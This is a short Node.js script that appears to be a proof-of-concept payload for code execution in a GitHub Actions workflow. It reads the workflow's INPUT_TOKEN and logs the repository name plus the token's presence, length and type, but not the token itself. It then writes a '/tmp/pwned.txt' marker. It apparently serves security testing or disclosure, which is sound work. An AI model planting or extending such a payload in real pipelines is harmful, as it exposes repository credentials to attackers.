const fs = require('fs');
const t = process.env.INPUT_TOKEN || '';
console.log('PWNED-EXEC repo=' + process.env.GITHUB_REPOSITORY + ' token_present=' + (t.length > 0) + ' token_len=' + t.length + ' token_kind=' + (t.startsWith('ghs_') ? 'ghs_app_or_workflow' : 'other'));
try { fs.writeFileSync('/tmp/pwned.txt', 'executed'); console.log('PWNED-MARKER wrote /tmp/pwned.txt'); } catch (e) { console.log('marker err ' + e.message); }
